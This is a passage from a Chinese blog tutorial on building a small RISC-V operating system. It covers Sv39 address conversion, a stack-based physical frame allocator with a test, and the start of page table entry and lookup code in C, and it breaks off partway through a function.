<p>**<code>virt_page_num_from_size_t</code>**：将一个 <code>uint64_t</code> 类型的值转换为虚拟页号 <code>VirtPageNum</code>。</p>
<ul>
<li>通过与掩码 <code>(1ULL &lt;&lt; VPN_WIDTH_SV39) - 1</code> 相与，确保结果在虚拟页号的有效范围内。</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 给定一个u64 转换为PhysAddr */</span></span><br><span class="line">PhysAddr <span class="title function_">phys_addr_from_size_t</span><span class="params">(<span class="type">uint64_t</span> v)</span> &#123;</span><br><span class="line">    PhysAddr addr;</span><br><span class="line">    addr.value = v &amp; ((<span class="number">1ULL</span> &lt;&lt; PA_WIDTH_SV39) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*给定一个u64 转换为PhysPageNum */</span></span><br><span class="line">PhysPageNum <span class="title function_">phys_page_num_from_size_t</span><span class="params">(<span class="type">uint64_t</span> v)</span> &#123;</span><br><span class="line">    PhysPageNum pageNum;</span><br><span class="line">    pageNum.value = v &amp; ((<span class="number">1ULL</span> &lt;&lt; PPN_WIDTH_SV39) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> pageNum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 给定一个PhysAddr转换为u64 */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">size_t_from_phys_addr</span><span class="params">(PhysAddr v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定一个PhysPageNum 转换为u64 */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">size_t_from_phys_page_num</span><span class="params">(PhysPageNum v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从物理页号转换为实际物理地址 */</span></span><br><span class="line">PhysAddr <span class="title function_">phys_addr_from_phys_page_num</span><span class="params">(PhysPageNum ppn)</span></span><br><span class="line">&#123;</span><br><span class="line">    PhysAddr addr;</span><br><span class="line">    addr.value = ppn.value &lt;&lt; PAGE_SIZE_BITS ;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定一个u64 转换为VirtAddr  */</span></span><br><span class="line">VirtAddr <span class="title function_">virt_addr_from_size_t</span><span class="params">(<span class="type">uint64_t</span> v)</span> &#123;</span><br><span class="line">    VirtAddr addr;</span><br><span class="line">    addr.value = v &amp; ((<span class="number">1ULL</span> &lt;&lt; VA_WIDTH_SV39) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定一个u64 转换为VirtPageNum  */</span></span><br><span class="line">VirtPageNum <span class="title function_">virt_page_num_from_size_t</span><span class="params">(<span class="type">uint64_t</span> v)</span> &#123;</span><br><span class="line">    VirtPageNum pageNum;</span><br><span class="line">    pageNum.value = v &amp; ((<span class="number">1ULL</span> &lt;&lt; VPN_WIDTH_SV39) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> pageNum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*给定一个VirtAddr 转换为一个u64 */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">size_t_from_virt_addr</span><span class="params">(VirtAddr v)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (v.value &gt;= (<span class="number">1ULL</span> &lt;&lt; (VA_WIDTH_SV39 - <span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> v.value | ~((<span class="number">1ULL</span> &lt;&lt; VA_WIDTH_SV39) - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> v.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 给定一个VirtPageNum 转换为 u64*/</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">size_t_from_virt_page_num</span><span class="params">(VirtPageNum v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 物理地址向下取整 */</span></span><br><span class="line">PhysPageNum <span class="title function_">floor_phys</span><span class="params">(PhysAddr phys_addr)</span> &#123;</span><br><span class="line">    PhysPageNum phys_page_num;</span><br><span class="line">    phys_page_num.value = phys_addr.value / PAGE_SIZE;</span><br><span class="line">    <span class="keyword">return</span> phys_page_num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 物理地址向上取整 */</span></span><br><span class="line">PhysPageNum <span class="title function_">ceil_phys</span><span class="params">(PhysAddr phys_addr)</span> &#123;</span><br><span class="line">    PhysPageNum phys_page_num;</span><br><span class="line">    phys_page_num.value = (phys_addr.value + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE;</span><br><span class="line">    <span class="keyword">return</span> phys_page_num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把虚拟地址转换为虚拟页号 */</span></span><br><span class="line">VirtPageNum <span class="title function_">virt_page_num_from_virt_addr</span><span class="params">(VirtAddr virt_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtPageNum vpn;</span><br><span class="line">    vpn.value =  virt_addr.value / PAGE_SIZE;</span><br><span class="line">    <span class="keyword">return</span> vpn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>页帧分配器</p>
<ul>
<li>实现了new：用于创建实例</li>
<li>alloc：分配</li>
<li>在分配 <code>alloc</code> 的时候，首先会检查栈 <code>recycled</code> 内有没有之前回收的物理页号，如果有的话直接弹出栈顶并返回；否则的话我们只能从之前从未分配过的物理页号区间 [ <code>current</code> , <code>end</code> ) 上进行分配，<strong>我们分配它的左端点 <code>current</code> ，同时将管理器内部维护的 <code>current</code> 加 <code>1</code> 代表 <code>current</code> 已被分配了。然后清空此页内存，全部初始化为0，最后返回分配的页的物理页号。</strong></li>
<li>dealloc：删除与回收<ul>
<li>需要检测合法性<ul>
<li>页面之前一定是被分配过，因此他的物理页号一定是 &lt; <code>current</code>的</li>
<li>该页面没有正处在回收状态，即它的物理页号不能在栈 <code>recycled</code> 中找到。</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* StackFrameAllocator*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> current;   <span class="comment">//空闲内存的起始物理页号</span></span><br><span class="line">    <span class="type">uint64_t</span>  end;      <span class="comment">//空闲内存的结束物理页号</span></span><br><span class="line">    Stack recycled;     <span class="comment">// 回收页</span></span><br><span class="line">&#125;StackFrameAllocator;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">StackFrameAllocator_new</span><span class="params">(StackFrameAllocator* allocator)</span> &#123;</span><br><span class="line">    allocator-&gt;current = <span class="number">0</span>;</span><br><span class="line">    allocator-&gt;end = <span class="number">0</span>;</span><br><span class="line">    initStack(&amp;allocator-&gt;recycled);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">StackFrameAllocator_init</span><span class="params">(StackFrameAllocator *allocator, PhysPageNum l, PhysPageNum r)</span> &#123;</span><br><span class="line">    allocator-&gt;current = l.value;</span><br><span class="line">    allocator-&gt;end = r.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PhysPageNum <span class="title function_">StackFrameAllocator_alloc</span><span class="params">(StackFrameAllocator *allocator)</span> &#123;</span><br><span class="line">    PhysPageNum ppn;</span><br><span class="line">    <span class="keyword">if</span> (allocator-&gt;recycled.top &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        ppn.value = pop(&amp;(allocator-&gt;recycled));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (allocator-&gt;current == allocator-&gt;end) &#123;</span><br><span class="line">            ppn.value = <span class="number">0</span>; <span class="comment">// Return 0 as None</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ppn.value = allocator-&gt;current++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 清空此页内存 ： 注意不能覆盖内核代码区，分配的内存只能是未使用部分*/</span></span><br><span class="line">    PhysAddr addr = phys_addr_from_phys_page_num(ppn);</span><br><span class="line">    <span class="built_in">memset</span>(addr.value,<span class="number">0</span>,PAGE_SIZE);</span><br><span class="line">    <span class="keyword">return</span> ppn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">StackFrameAllocator_dealloc</span><span class="params">(StackFrameAllocator *allocator, PhysPageNum ppn)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> ppnValue = ppn.value;</span><br><span class="line">    <span class="comment">// 检查回收的页面之前一定被分配出去过</span></span><br><span class="line">    <span class="keyword">if</span> (ppnValue &gt;= allocator-&gt;current) &#123;</span><br><span class="line">        printk(<span class="string">&quot;Frame ppn=%lx has not been allocated!\n&quot;</span>, ppnValue);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查未在回收列表中</span></span><br><span class="line">    <span class="keyword">if</span>(allocator-&gt;recycled.top&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt;= allocator-&gt;recycled.top; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ppnValue ==allocator-&gt;recycled.data[i] )</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 回收物理内存页号</span></span><br><span class="line">    push(&amp;(allocator-&gt;recycled), ppnValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>测试程序：</strong></p>
<p>测试函数一次调用了<code>new，init</code> ，然后尝试分配五页内存，并打印五页内存的物理页号，然后将分配的五页内存释放掉，此时这五页内存应该会全部被压入<code>recycled</code>栈中，然后再次分配五页内存，此时分配的话就是从<code>recycled</code>中<code>pop</code>的内存了。强调一下在<code>StackFrameAllocator_init</code>函数中传入的起始物理内存的地址必须在内核代码段之上，在头文件中进行了定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> StackFrameAllocator FrameAllocatorImpl;</span><br><span class="line"><span class="type">void</span> <span class="title function_">frame_allocator_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    StackFrameAllocator_new(&amp;FrameAllocatorImpl);</span><br><span class="line">    StackFrameAllocator_init(&amp;FrameAllocatorImpl, \</span><br><span class="line">            floor_phys(<span class="type">phys_addr_from_size_t</span>(MEMORY_START)), \</span><br><span class="line">            ceil_phys(<span class="type">phys_addr_from_size_t</span>(MEMORY_END)));</span><br><span class="line">    printk(<span class="string">&quot;Memoery start:%d\n&quot;</span>,floor_phys(<span class="type">phys_addr_from_size_t</span>(MEMORY_START)));</span><br><span class="line">    printk(<span class="string">&quot;Memoery end:%d\n&quot;</span>,ceil_phys(<span class="type">phys_addr_from_size_t</span>(MEMORY_END)));</span><br><span class="line">   <span class="comment">// 第一次分配</span></span><br><span class="line">    PhysPageNum frame[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">         frame[i] = StackFrameAllocator_alloc(&amp;FrameAllocatorImpl);</span><br><span class="line">         printk(<span class="string">&quot;frame id:%d\n&quot;</span>,frame[i].value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 回收</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">     &#123;</span><br><span class="line">         StackFrameAllocator_dealloc(&amp;FrameAllocatorImpl,frame[i]);</span><br><span class="line">         printk(<span class="string">&quot;allocator-&gt;recycled.data.value:%d\n&quot;</span>,FrameAllocatorImpl.recycled.data[i]);</span><br><span class="line">         printk(<span class="string">&quot;frame id:%d\n&quot;</span>,frame[i].value);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">// 再分配</span></span><br><span class="line">     PhysPageNum frame_test[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">          frame[i] = StackFrameAllocator_alloc(&amp;FrameAllocatorImpl);</span><br><span class="line">         printk(<span class="string">&quot;frame id:%d\n&quot;</span>,frame[i].value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-测试"><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h1><blockquote>
<p>mian.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sifanos/os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">frame_allocator_test</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello!!!\n&quot;</span>);</span><br><span class="line">    frame_allocator_test();    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//trap_init();</span></span><br><span class="line">    <span class="comment">//task_init();</span></span><br><span class="line">    <span class="comment">//timer_init(); // 时钟初始化</span></span><br><span class="line">    <span class="comment">//run_first_task();</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240621154445235.png" alt="image-20240621154445235"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240621160558362.png" alt="image-20240621160558362" style="zoom:80%;">

<p><strong>本节新增了以上的文件</strong>：</p>
<ul>
<li>在<code>stack</code>中实现了栈这个数据结构，因为后续的内存管理需要用到栈。<ul>
<li>实现了栈的常用接口<code>push</code>，<code>pop</code>，<code>top</code>等</li>
</ul>
</li>
<li>在<code>assert</code>中，实现了断言</li>
<li>在<code>address</code>中，实现了Sv39的三级页表内存管理<ul>
<li>实现了将<code>uint_64</code>转换位物理地址，虚拟地址等 <code>PPN</code>,<code>VPN</code></li>
<li>实现了页表条目的管理</li>
<li>实现了栈帧的管理，<code>new</code>，<code>alloc</code>，<code>dealloc</code>等内存分配回收函数</li>
<li>对物理页分配进行了测试，测试了<code>new</code> <code>alloc</code>，<code>dealloc</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-14-内存映射机制实现</title>
    <url>/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-页表操作"><a href="#1-页表操作" class="headerlink" title="1.页表操作"></a>1.页表操作</h1><h2 id="1-1页表项定义"><a href="#1-1页表项定义" class="headerlink" title="1.1页表项定义"></a>1.1页表项定义</h2><p><img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240624160044495.png" alt="image-20240624160044495"></p>
<p>64<strong>位页表项布局</strong>：</p>
<ul>
<li>低10位：存储下级物理页的属性标志位</li>
<li>10-54位：存储下级页表的物理页号</li>
</ul>
<blockquote>
<p>address.h</p>
<p>定义页表项结构体64位以及0-9的标记位</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 定义页表项 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> bits;</span><br><span class="line">&#125;PageTableEntry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义位掩码常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_V (1 &lt;&lt; 0)   <span class="comment">//有效位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_R (1 &lt;&lt; 1)   <span class="comment">//可读属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_W (1 &lt;&lt; 2)   <span class="comment">//可写属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_X (1 &lt;&lt; 3)   <span class="comment">//可执行属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_U (1 &lt;&lt; 4)   <span class="comment">//用户访问模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_G (1 &lt;&lt; 5)   <span class="comment">//全局映射</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1 &lt;&lt; 6)   <span class="comment">//访问标志位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_D (1 &lt;&lt; 7)   <span class="comment">//脏位</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>address.c</p>
<p>定义一些操作PTE的函数</p>
<p>通过一些移位的操作进行判断</p>
<p>**<code>ppn.value = (entry-&gt;bits &gt;&gt; 10) &amp; ((1ul &lt;&lt; 44) - 1)</code>**：</p>
<ul>
<li><code>entry-&gt;bits &gt;&gt; 10</code>：将页表条目的 <code>bits</code> 字段右移10位，去掉低10位的标志位，得到物理页号部分。</li>
<li><code>((1ul &lt;&lt; 44) - 1)</code>：生成一个44位的掩码（0xFFFFFFFFFFF），用于提取物理页号部分。这个掩码确保物理页号部分的最高44位保留，而低位的标志位被清除。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 新建一个页表项*/</span></span><br><span class="line">PageTableEntry <span class="title function_">PageTableEntry_new</span><span class="params">(PhysPageNum ppn, <span class="type">uint8_t</span> PTEFlags)</span> &#123;</span><br><span class="line">    PageTableEntry entry;</span><br><span class="line">    entry.bits = (ppn.value &lt;&lt; <span class="number">10</span>) | PTEFlags;</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 判断页表项是否为空*/</span></span><br><span class="line">PageTableEntry <span class="title function_">PageTableEntry_empty</span><span class="params">()</span> &#123;</span><br><span class="line">    PageTableEntry entry;</span><br><span class="line">    entry.bits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取下级页表的PPN*/</span></span><br><span class="line">PhysPageNum <span class="title function_">PageTableEntry_ppn</span><span class="params">(PageTableEntry *entry)</span> &#123;</span><br><span class="line">    PhysPageNum ppn;</span><br><span class="line">    ppn.value = (entry-&gt;bits &gt;&gt; <span class="number">10</span>) &amp; ((<span class="number">1ul</span> &lt;&lt; <span class="number">44</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ppn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取标志位*/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">PageTableEntry_flags</span><span class="params">(PageTableEntry *entry)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> entry-&gt;bits &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 判断页表项是否有效*/</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">PageTableEntry_is_valid</span><span class="params">(PageTableEntry *entry)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> entryFlags = PageTableEntry_flags(entry);</span><br><span class="line">    <span class="keyword">return</span> (entryFlags &amp; PTE_V) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-2物理页帧获取"><a href="#1-2物理页帧获取" class="headerlink" title="1.2物理页帧获取"></a>1.2物理页帧获取</h2><p><strong>虚拟地址向物理地址转换过程</strong></p>
<img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240620172006572.png" alt="image-20240620172006572" style="zoom:80%;">

<ul>
<li>PTE存放是的可能下一级的PTE 以及最终的 物理地址的PPN，需要访问物理页号对应的物理帧的内存数据，定义了两个辅助函数</li>
<li>将PPN转化为物理地址，并返回该地址对应的字节数组指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint8_t</span>* <span class="title function_">get_bytes_array</span><span class="params">(PhysPageNum ppn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 先从物理页号转换为物理地址</span></span><br><span class="line">    PhysAddr addr = phys_addr_from_phys_page_num(ppn);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>*) addr.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>转换为PTE</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PageTableEntry* <span class="title function_">get_pte_array</span><span class="params">(PhysPageNum ppn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 先从物理页号转换为物理地址</span></span><br><span class="line">    PhysAddr addr = phys_addr_from_phys_page_num(ppn);</span><br><span class="line">    <span class="keyword">return</span> (PageTableEntry*) addr.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-3-PT与PTE"><a href="#1-3-PT与PTE" class="headerlink" title="1.3 PT与PTE"></a>1.3 PT与PTE</h3><ul>
<li><strong>PT：</strong>页表是一个<strong>包含多个 PTE 的数据结构</strong>，用于存储虚拟地址到物理地址的映射。</li>
<li><strong>PTE：</strong>页表条目<strong>是页表中的一个条目</strong>，表示具体的虚拟地址到物理地址的映射关系。</li>
</ul>
<h1 id="2-虚实地址映射"><a href="#2-虚实地址映射" class="headerlink" title="2.虚实地址映射"></a>2.虚实地址映射</h1><p><code>rcore</code><strong>的内存映射实现如下</strong></p>
<img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240624165741735.png" alt="image-20240624165741735" style="zoom:67%;">

<p>同前面提到的差不多</p>
<ul>
<li><p>首先通过VPN[2]结合SATP拿到第三级的PTE 然后不断结合VPN 得到最后的物理地址</p>
</li>
<li><p>首先通过辅助函数拿到虚拟地址的三级VPN</p>
</li>
</ul>
<blockquote>
<p>address.c</p>
<p>获取虚拟页表的三级索引</p>
<p>从 <code>vpn.value</code> 中提取三级索引：</p>
<ul>
<li>使用 <code>&amp; 0x1ff</code> 提取低9位（1_1111_1111），这是每级索引的范围（512个条目）。</li>
<li>右移9位，准备提取下一个索引。</li>
<li>从高到低（i &#x3D; 2, 1, 0）提取三级索引。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 拿到虚拟页号的三级索引，按照从高到低的顺序返回 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">indexes</span><span class="params">(VirtPageNum vpn, <span class="type">size_t</span>* result)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> idx[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        idx[i] = vpn.value &amp; <span class="number">0x1ff</span>;   <span class="comment">// 1_1111_1111 = 0x1ff</span></span><br><span class="line">        vpn.value &gt;&gt;= <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        result[i] = idx[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>有了<code>PTE</code>，还需要一个<code>PT</code> 对<code>PTE</code> 进行管理。因此 <code>PageTable</code> 要保存它根节点的物理页号 <code>root_ppn</code> 作为页表唯一的区分标志。</li>
</ul>
<blockquote>
<p>address.h</p>
<p>PT实现</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 定义页表 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PhysPageNum root_ppn; <span class="comment">//根节点</span></span><br><span class="line">&#125;PageTable;</span><br></pre></td></tr></table></figure>



<ul>
<li>现在已经有了页表项<code>PT</code>，如何在PT中查找<code>PTE</code>，</li>
<li>传入一个<code>PageTable</code>，根据此页表的根节点开始遍历，根节点的物理页号是保存在<code>satp</code>寄存器中的，从页表中根据虚拟地址的页表项索引来取出具体的页表项，如果此页表项为空，则分配一页内存，然后新建一个页表项进行填充。直到三级页表索引完毕，会返回虚拟地址最终对应的三级页表的页表项，此时三级页表的页表项是空的，在进行map时只需要对此页表项赋值就行。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 查找PTE 若没有则新建一个*/</span></span><br><span class="line">PageTableEntry* <span class="title function_">find_pte_create</span><span class="params">(PageTable* pt,VirtPageNum vpn)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 拿到虚拟页号的三级索引，保存到idx数组中</span></span><br><span class="line">    <span class="type">size_t</span> idx[<span class="number">3</span>];</span><br><span class="line">    indexes(vpn, idx); </span><br><span class="line">    <span class="comment">//根节点</span></span><br><span class="line">    PhysPageNum ppn = pt-&gt;root_ppn;</span><br><span class="line">    <span class="comment">//从根节点开始遍历，如果没有pte，就分配一页内存，然后创建一个</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//拿到具体的页表项</span></span><br><span class="line">        PageTableEntry* pte =  &amp;get_pte_array(ppn)[idx[i]];</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> pte;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//如果此项页表为空</span></span><br><span class="line">            <span class="keyword">if</span> (!PageTableEntry_is_valid(pte)) &#123;</span><br><span class="line">                <span class="comment">//分配一页物理内存</span></span><br><span class="line">                PhysPageNum frame =  StackFrameAllocator_alloc(&amp;FrameAllocatorImpl);</span><br><span class="line">               <span class="comment">//新建一个页表项</span></span><br><span class="line">               *pte =  PageTableEntry_new(frame,PTE_V);</span><br><span class="line">               <span class="comment">//压入栈中</span></span><br><span class="line">               <span class="comment">// push(&amp;pt-&gt;frames,frame.value);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//取出进入下级页表的物理页号</span></span><br><span class="line">        ppn = PageTableEntry_ppn(pte);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>find_pte</code>只查找页表项不创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PageTableEntry* <span class="title function_">find_pte</span><span class="params">(PageTable* pt, VirtPageNum vpn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 拿到虚拟页号的三级索引，保存到idx数组中</span></span><br><span class="line">    <span class="type">size_t</span> idx[<span class="number">3</span>];</span><br><span class="line">    indexes(vpn, idx); </span><br><span class="line">    <span class="comment">//根节点</span></span><br><span class="line">    PhysPageNum ppn = pt-&gt;root_ppn;</span><br><span class="line">    <span class="comment">//从根节点开始遍历，如果没有pte，就分配一页内存，然后创建一个</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//拿到具体的页表项</span></span><br><span class="line">        PageTableEntry* pte =  &amp;get_pte_array(ppn)[idx[i]];</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">2</span>) 